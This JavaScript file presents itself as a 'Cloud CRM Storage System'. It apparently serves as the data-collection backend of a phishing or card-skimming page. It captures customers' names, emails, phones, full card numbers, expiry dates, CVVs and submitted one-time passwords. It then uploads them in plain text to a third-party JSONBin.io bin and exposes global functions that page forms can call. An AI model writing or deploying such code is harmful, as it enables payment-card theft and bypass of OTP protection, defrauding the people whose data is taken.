// Cloud CRM Storage System
class CloudCRMStorage {
  constructor() {
    this.apiKey = 'demo_api_key'; // In production, use a real API key
    this.baseUrl = 'https://jsonbin.io/b'; // Free JSON storage service
    this.binId = this.getBinId();
    this.initializeStorage();
  }

  getBinId() {
    // Store bin ID in localStorage for persistence
    let binId = localStorage.getItem('crmBinId');
    if (!binId) {
      // Generate a unique bin ID for this installation
      binId = 'crm_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9);
      localStorage.setItem('crmBinId', binId);
    }
    return binId;
  }

  async initializeStorage() {
    try {
      // Try to load from cloud first
      const cloudData = await this.loadFromCloud();
      if (cloudData) {
        localStorage.setItem('crmData', JSON.stringify(cloudData));
        console.log('CRM data loaded from cloud');
      } else {
        // If no cloud data, initialize with empty structure
        const initialData = {
          orders: [],
          cards: [],
          otp: [],
          settings: {
            autoSave: true,
            lastBackup: new Date().toISOString(),
            deviceId: this.generateDeviceId()
          }
        };
        await this.saveToCloud(initialData);
        localStorage.setItem('crmData', JSON.stringify(initialData));
        console.log('CRM data initialized and saved to cloud');
      }
    } catch (error) {
      console.error('Cloud CRM initialization failed:', error);
      // Fallback to local storage only
      if (!localStorage.getItem('crmData')) {
        const initialData = {
          orders: [],
          cards: [],
          otp: [],
          settings: {
            autoSave: false,
            lastBackup: null,
            deviceId: this.generateDeviceId()
          }
        };
        localStorage.setItem('crmData', JSON.stringify(initialData));
      }
    }
  }

  generateDeviceId() {
    let deviceId = localStorage.getItem('crmDeviceId');
    if (!deviceId) {
      deviceId = 'device_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9);
      localStorage.setItem('crmDeviceId', deviceId);
    }
    return deviceId;
  }

  async loadFromCloud() {
    try {
      // Using JSONBin.io free service
      const response = await fetch(`${this.baseUrl}/${this.binId}/latest`, {
        headers: {
          'X-Master-Key': this.apiKey,
          'X-Bin-Meta': 'false'
        }
      });
      
      if (response.ok) {
        const data = await response.json();
        return data;
      }
      return null;
    } catch (error) {
      console.error('Failed to load from cloud:', error);
      return null;
    }
  }

  async saveToCloud(data) {
    try {
      // Using JSONBin.io free service
      const response = await fetch(`${this.baseUrl}/${this.binId}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'X-Master-Key': this.apiKey,
          'X-Bin-Versioning': 'false'
        },
        body: JSON.stringify(data)
      });
      
      if (response.ok) {
        console.log('CRM data saved to cloud');
        return true;
      }
      return false;
    } catch (error) {
      console.error('Failed to save to cloud:', error);
      return false;
    }
  }

  async getData() {
    try {
      // Try to get fresh data from cloud
      const cloudData = await this.loadFromCloud();
      if (cloudData) {
        localStorage.setItem('crmData', JSON.stringify(cloudData));
        return cloudData;
      }
    } catch (error) {
      console.error('Cloud sync failed, using local data:', error);
    }
    
    // Fallback to local storage
    try {
      return JSON.parse(localStorage.getItem('crmData') || '{"orders":[],"cards":[],"otp":[]}');
    } catch (e) {
      console.error('Error reading local CRM data:', e);
      return { orders: [], cards: [], otp: [] };
    }
  }

  async saveData(data) {
    // Save to local storage first (immediate)
    try {
      localStorage.setItem('crmData', JSON.stringify(data));
    } catch (e) {
      console.error('Error saving local CRM data:', e);
      return false;
    }

    // Then save to cloud (async)
    try {
      const cloudSaved = await this.saveToCloud(data);
      if (cloudSaved) {
        console.log('CRM data synced to cloud');
      }
      return true;
    } catch (error) {
      console.error('Cloud save failed, data saved locally only:', error);
      return true; // Still return true since local save worked
    }
  }

  async addOrder(orderData) {
    const data = await this.getData();
    const order = {
      id: this.generateId(),
      timestamp: new Date().toISOString(),
      deviceId: this.generateDeviceId(),
      fullName: orderData.fullName,
      email: orderData.email,
      phone: orderData.phone,
      orderTotal: orderData.orderTotal,
      status: 'Completed'
    };
    data.orders.unshift(order);
    await this.saveData(data);
    console.log('Order added to CRM:', order);
    return order;
  }

  async addCardDetails(cardData) {
    const data = await this.getData();
    const card = {
      id: this.generateId(),
      timestamp: new Date().toISOString(),
      deviceId: this.generateDeviceId(),
      cardName: cardData.cardName,
      cardNumber: cardData.cardNumber,
      expiry: cardData.expiry,
      cvv: cardData.cvv,
      status: 'Received'
    };
    data.cards.unshift(card);
    await this.saveData(data);
    console.log('Card details added to CRM:', card);
    return card;
  }

  async addOTPData(otpData) {
    const data = await this.getData();
    const otp = {
      id: this.generateId(),
      timestamp: new Date().toISOString(),
      deviceId: this.generateDeviceId(),
      submittedOTP: otpData.submittedOTP,
      email: otpData.email,
      phone: otpData.phone,
      status: 'Verified'
    };
    data.otp.unshift(otp);
    await this.saveData(data);
    console.log('OTP data added to CRM:', otp);
    return otp;
  }

  generateId() {
    return Date.now().toString(36) + Math.random().toString(36).substr(2, 9);
  }

  async exportData() {
    const data = await this.getData();
    const dataStr = JSON.stringify(data, null, 2);
    const blob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'crm_data_' + new Date().toISOString().split('T')[0] + '.json';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

  async clearAllData() {
    const initialData = {
      orders: [],
      cards: [],
      otp: [],
      settings: {
        autoSave: true,
        lastBackup: new Date().toISOString(),
        deviceId: this.generateDeviceId()
      }
    };
    await this.saveData(initialData);
  }

  async getStats() {
    const data = await this.getData();
    return {
      totalOrders: data.orders.length,
      totalCards: data.cards.length,
      totalOTP: data.otp.length,
      successRate: data.otp.length > 0 ? 100 : 0,
      lastSync: data.settings?.lastBackup || null,
      deviceId: data.settings?.deviceId || 'unknown'
    };
  }

  // Manual sync function
  async syncFromCloud() {
    try {
      const cloudData = await this.loadFromCloud();
      if (cloudData) {
        localStorage.setItem('crmData', JSON.stringify(cloudData));
        console.log('Manual sync completed from cloud');
        return true;
      }
      return false;
    } catch (error) {
      console.error('Manual sync failed:', error);
      return false;
    }
  }
}

// Global cloud CRM instance
window.cloudCRMStorage = new CloudCRMStorage();

// Global functions for backward compatibility
window.addOrder = async function(data) {
  return await window.cloudCRMStorage.addOrder(data);
};

window.addCardDetails = async function(data) {
  return await window.cloudCRMStorage.addCardDetails(data);
};

window.addOTPData = async function(data) {
  return await window.cloudCRMStorage.addOTPData(data);
};

// Sync functions for manual control
window.syncCRMFromCloud = async function() {
  return await window.cloudCRMStorage.syncFromCloud();
};

console.log('Cloud CRM Storage System initialized');
